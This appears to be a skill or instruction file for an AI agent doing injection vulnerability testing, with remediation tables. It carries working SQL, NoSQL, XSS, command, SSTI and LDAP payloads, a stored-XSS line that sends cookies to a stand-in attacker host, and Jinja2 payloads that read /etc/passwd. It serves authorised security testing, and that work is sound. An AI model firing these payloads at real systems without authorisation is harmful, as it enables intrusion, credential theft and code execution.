---
name: injection-testing
description: Injection vulnerability testing covering SQL injection, NoSQL injection, XSS (reflected, stored and DOM-based), OS command injection, Server-Side Template Injection (SSTI) and LDAP injection. Includes payloads, detection techniques and remediation for each type.
---

# Injection Vulnerability Testing

You are a security engineer testing for injection vulnerabilities. Injection attacks occur when untrusted data is sent to an interpreter as part of a command or query.

## When to Use

- Testing input fields, query parameters, headers and body parameters for injection
- Auditing API endpoints that interact with databases
- Looking for XSS in fields that render user content
- Testing server-side template engines for SSTI

## Phase 1 — Input Surface Mapping

Before testing, enumerate all injection points:

```bash
# Find all parameters in URLs
curl -s "TARGET_URL" | grep -oP '(href|action|src)="[^"]*\?[^"]*"'

# Find form inputs
curl -s "TARGET_URL" | grep -oP '<input[^>]+name="[^"]+"'
```

Catalog:
- URL query parameters: `?id=`, `?search=`, `?page=`
- POST body fields
- HTTP headers: `User-Agent`, `Referer`, `X-Forwarded-For`, `Cookie`
- Path parameters: `/users/{id}`, `/items/{name}`
- JSON body fields

## Phase 2 — SQL Injection

### Detection

```bash
BASE="https://target.com/api/search?q="

# Error-based detection
curl -s "${BASE}'"                    # Single quote — triggers SQL error
curl -s "${BASE}1 AND 1=1"           # True condition
curl -s "${BASE}1 AND 1=2"           # False condition — response should differ
curl -s "${BASE}1; SELECT SLEEP(5)--" # Time-based blind (5s delay = vulnerable)
```

### Exploitation (evidence only — stop after confirming)

```bash
# Union-based — determine number of columns
curl -s "${BASE}1 ORDER BY 1--"
curl -s "${BASE}1 ORDER BY 2--"
# Continue until error → column count found

# Extract database version
curl -s "${BASE}' UNION SELECT version(),null,null--"

# Extract table names
curl -s "${BASE}' UNION SELECT table_name,null,null FROM information_schema.tables--"
```

### In JSON/POST bodies

```bash
curl -s -X POST "TARGET_URL/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@test.com'\'' OR '\''1'\''='\''1","password":"anything"}'

# NoSQL injection (MongoDB)
curl -s -X POST "TARGET_URL/login" \
  -H "Content-Type: application/json" \
  -d '{"email":{"$gt":""},"password":{"$gt":""}}'
```

## Phase 3 — Cross-Site Scripting (XSS)

### Reflected XSS

```bash
# Test in URL parameters
PAYLOADS=(
  "<script>alert(1)</script>"
  "<img src=x onerror=alert(1)>"
  "javascript:alert(1)"
  "'><script>alert(1)</script>"
  "<svg onload=alert(1)>"
  "\"><img src=x onerror=alert(document.domain)>"
)

for payload in "${PAYLOADS[@]}"; do
  encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${payload}'))")
  response=$(curl -s "TARGET_URL/search?q=${encoded}")
  if echo "$response" | grep -q "alert(1)"; then
    echo "VULNERABLE: ${payload}"
  fi
done
```

### Stored XSS

Test all fields that store and later display user input (comments, feedback, profile names, bio, addresses):

```bash
# Submit XSS payload as stored content
curl -s -X POST "TARGET_URL/feedback" \
  -H "Content-Type: application/json" \
  -d '{"text": "<script>fetch(\"https://attacker.com/?c=\"+document.cookie)</script>"}'

# Then fetch the page that renders this content and check if script tag is present
curl -s "TARGET_URL/admin/feedbacks" | grep -o "<script>"
```

### DOM-Based XSS

Look for dangerous JavaScript patterns in JS bundles:

```bash
curl -s "TARGET_URL/bundle.js" | grep -oP '(innerHTML|outerHTML|document\.write|eval|setTimeout|setInterval)\s*[=\(][^;]+' | head -20
```

## Phase 4 — OS Command Injection

```bash
# In any field that might execute system commands
PAYLOADS=(
  "; id"
  "| id"
  "&& id"
  "\`id\`"
  "; sleep 5"   # Time-based blind
  "| sleep 5"
)

for payload in "${PAYLOADS[@]}"; do
  start=$(date +%s)
  curl -s -X POST "TARGET_URL/ping" \
    -d "host=127.0.0.1${payload}"
  end=$(date +%s)
  elapsed=$((end - start))
  echo "Payload '${payload}': ${elapsed}s"
done
```

## Phase 5 — Server-Side Template Injection (SSTI)

```bash
# Math expressions that templating engines evaluate
PAYLOADS=(
  "{{7*7}}"          # Jinja2, Twig → 49
  "${7*7}"           # FreeMarker, Thymeleaf → 49
  "<%= 7*7 %>"       # ERB → 49
  "#{7*7}"           # Ruby
  "{{7*'7'}}"        # Jinja2 → 7777777
)

for payload in "${PAYLOADS[@]}"; do
  encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${payload}'))")
  response=$(curl -s "TARGET_URL/render?template=${encoded}")
  if echo "$response" | grep -qE "^49$|7777777"; then
    echo "SSTI CONFIRMED with: ${payload}"
  fi
done
```

### SSTI Exploitation (Jinja2)

```python
# Read files
{{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}

# List directory  
{{''.__class__.__mro__[1].__subclasses__()[396]('ls /',shell=True,stdout=-1).communicate()[0].strip()}}
```

## Phase 6 — LDAP Injection

```bash
# In login fields for LDAP-based auth
curl -s -X POST "TARGET_URL/login" \
  -d "username=*)(uid=*))(|(uid=*&password=anything"

# Authentication bypass
curl -s -X POST "TARGET_URL/login" \
  -d "username=admin)(&password=x"
```

## Phase 7 — HTTP Header Injection

```bash
# Test User-Agent, Referer, X-Forwarded-For for injection
curl -s "TARGET_URL/api" \
  -H "X-Forwarded-For: 127.0.0.1' UNION SELECT version()--" \
  -H "User-Agent: <script>alert(1)</script>"
```

## Risk Classification

| Finding | Severity |
|---------|----------|
| SQL injection with data extraction confirmed | Critical |
| Authentication bypass via SQLi or NoSQL injection | Critical |
| OS command injection with code execution | Critical |
| SSTI with code execution | Critical |
| Stored XSS in admin panel | High |
| Stored XSS in user-facing pages | High |
| Reflected XSS | Medium |
| DOM-based XSS | Medium |
| SQL injection (error-based, no extraction) | High |
| LDAP injection | High |

## Remediation Summary

| Type | Fix |
|------|-----|
| SQL injection | Parameterized queries / ORM — never string concatenation |
| NoSQL injection | Validate and type-check input before passing to DB driver |
| XSS | Escape output with context-aware encoding; use Content-Security-Policy |
| Command injection | Never pass user input to shell — use language APIs instead |
| SSTI | Use logic-less templates; sandbox template engine; validate input |
| LDAP injection | Use LDAP escaping libraries; validate input format |
